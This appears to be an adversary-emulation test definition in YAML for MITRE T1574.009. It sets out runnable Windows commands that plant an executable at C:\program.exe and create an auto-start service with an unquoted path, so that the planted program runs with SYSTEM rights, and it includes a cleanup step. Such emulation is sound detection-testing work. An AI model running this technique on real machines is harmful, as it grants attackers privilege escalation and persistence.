- requirements: []
  name: Soumaia ART Tests - Execution of program.exe as service with unquoted service path
  description: 'When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability

    known as Unquoted Service Path which allows a user to gain SYSTEM privileges.

    In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe. (requires elevation)'
  tactic: stealth
  technique_id: T1574.009
  technique_name: 'Hijack Execution Flow: Path Interception by Unquoted Path'
  executors:
  - cleanup:
    - sc stop "Example Service" >nul 2>&1 & sc delete "Example Service" >nul 2>&1 & del "C:\Program Files\windows_service.exe" >nul 2>&1 & del "C:\program.exe" >nul 2>&1 & del "C:\Time.log" >nul 2>&1
    timeout: 60
    platform: windows
    name: cmd
    payloads:
    - WindowsServiceExample.exe
    parsers: []
    command: copy ".\WindowsServiceExample.exe" "C:\Program Files\windows_service.exe" & copy ".\WindowsServiceExample.exe" "C:\program.exe" & sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto & sc start "Example Service"
  id: dc7e43cf-1b12-5e13-a54a-983a3a30236e
